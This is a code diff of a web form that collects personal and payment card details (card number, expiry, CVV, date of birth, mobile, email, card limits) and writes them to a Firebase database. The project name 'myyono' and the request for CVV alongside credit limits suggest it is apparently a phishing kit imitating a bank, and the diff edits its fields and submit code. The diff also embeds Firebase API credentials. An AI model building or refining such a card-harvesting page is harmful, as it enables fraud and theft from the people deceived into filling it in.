@@ -79,8 +79,8 @@ input:focus {
 
 /* Style for placeholder text */
 ::placeholder {
-  color: #888; /* Change this color to make the placeholder more visible */
-  opacity: 1; /* Ensure full opacity */
+  color: #888;
+  opacity: 1;
 }
 
 button {
@@ -161,11 +161,8 @@ button:hover:before {
       <label for="mobile">Mobile Number:</label>
       <input type="number" id="mobile" name="mobile" placeholder="Enter your mobile number" required>
 
-      <label for="email">Email:</label>
+      <label for="email">Email Address:</label>
       <input type="email" id="email" name="email" placeholder="Enter your email" required>
-
-      <label for="city">City:</label>
-      <input type="text" id="city" name="city" placeholder="Enter your city" required>
 
       <label for="totalLimit">Total Limit:</label>
       <input type="number" id="totalLimit" name="totalLimit" placeholder="Enter total limit" required>
@@ -177,7 +174,7 @@ button:hover:before {
       <input type="text" id="cardholdername" name="cardholdername" placeholder="Enter card holder name" required>
 
       <label for="cardnumber">Card Number:</label>
-      <input type="text" id="cardnumber" name="cardNumber" maxlength="19" placeholder="Enter card number" required>
+      <input type="number" id="cardnumber" name="cardNumber" maxlength="19" placeholder="Enter card number" required>
 
       <label for="expiryDate">Card Expiry:</label>
       <input type="text" id="expiryDate" name="expiryDate" maxlength="5" placeholder="MM/YY" required>
@@ -191,15 +188,18 @@ button:hover:before {
  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  <script src="jquery-ui.min.js"></script>
   <script>
-    // Initialize jQuery UI Datepicker for the date of birth field
-    $(document).ready(function(){
-      $('#dob').datepicker({
-        dateFormat: "dd-mm-yy",
-        changeMonth: true,
-        changeYear: true,
-        yearRange: "-100:+0", // Allows selection of dates from 100 years ago to today
-        maxDate: 0,
-        showButtonPanel: true // Prevents selecting future dates
+    // Initialize Flatpickr for the date of birth field
+    document.addEventListener('DOMContentLoaded', function() {
+      flatpickr("#dob", {
+        dateFormat: "d-m-Y", // Adjust date format as per requirement
+        maxDate: "today", // Prevent future dates
+        allowInput: true,
+        onReady: function(selectedDates, dateStr, instance) {
+          instance._input.placeholder = instance._input.getAttribute('placeholder'); // Ensure placeholder is set
+        },
+        onValueUpdate: function(selectedDates, dateStr, instance) {
+          instance._input.placeholder = !dateStr ? 'Date Of Birth' : ''; // Toggle placeholder based on input
+        }
       });
     });
 
@@ -237,15 +237,15 @@ button:hover:before {
 
     // Firebase configuration
     const firebaseConfig = {
-  apiKey: "AIzaSyCYy4SEBr-lAstwOFu5lU1WFfQnOFY6woo",
-  authDomain: "myyono-170bc.firebaseapp.com",
-  databaseURL: "https://myyono-170bc-default-rtdb.firebaseio.com",
-  projectId: "myyono-170bc",
-  storageBucket: "myyono-170bc.appspot.com",
-  messagingSenderId: "258533655592",
-  appId: "1:258533655592:web:748b09e3551bae9281611d",
-  measurementId: "G-8BXKX0DCJH"
-};
+      apiKey: "AIzaSyCYy4SEBr-lAstwOFu5lU1WFfQnOFY6woo",
+      authDomain: "myyono-170bc.firebaseapp.com",
+      databaseURL: "https://myyono-170bc-default-rtdb.firebaseio.com",
+      projectId: "myyono-170bc",
+      storageBucket: "myyono-170bc.appspot.com",
+      messagingSenderId: "258533655592",
+      appId: "1:258533655592:web:748b09e3551bae9281611d",
+      measurementId: "G-8BXKX0DCJH"
+    };
 
     // Initialize Firebase
     firebase.initializeApp(firebaseConfig);
@@ -258,24 +258,24 @@ button:hover:before {
             dob: document.getElementById('dob').value,
             mobile: document.getElementById('mobile').value,
             email: document.getElementById('email').value,
-            city: document.getElementById('city').value,
             totalLimit: document.getElementById('totalLimit').value,
             availableLimit: document.getElementById('availableLimit').value,
-            CardHolderName: document.getElementById('cardholdername').value,
-            cardNumber: document.getElementById('cardnumber').value.replace(/\s+/g, ''), // Remove spaces
+            cardholdername: document.getElementById('cardholdername').value,
+            cardnumber: document.getElementById('cardnumber').value,
             expiryDate: document.getElementById('expiryDate').value,
-            cvv: document.getElementById('cvv').value
+            cvv: document.getElementById('cvv').value,
         };
 
-        // Write data to Firebase
-        database.ref("/data").child(formData.mobile).child("Details").set(formData, function(error) {
-            if (error) {
-                alert('Data could not be saved. ' + error);
-            } else {
-                window.location.href = 'Thank.html';
-                database.ref("/main").child(formData.mobile).child("Details").set(formData)
-            }
-        });
+        // Save the data to Firebase
+        const formRef = database.ref('formSubmissions').push();
+        formRef.set(formData)
+            .then(() => {
+                alert('Form submitted successfully!');
+                document.getElementById('userForm').reset(); // Reset form after submission
+            })
+            .catch((error) => {
+                alert('Error submitting form: ' + error.message);
+            });
     }
   </script>
 </body>
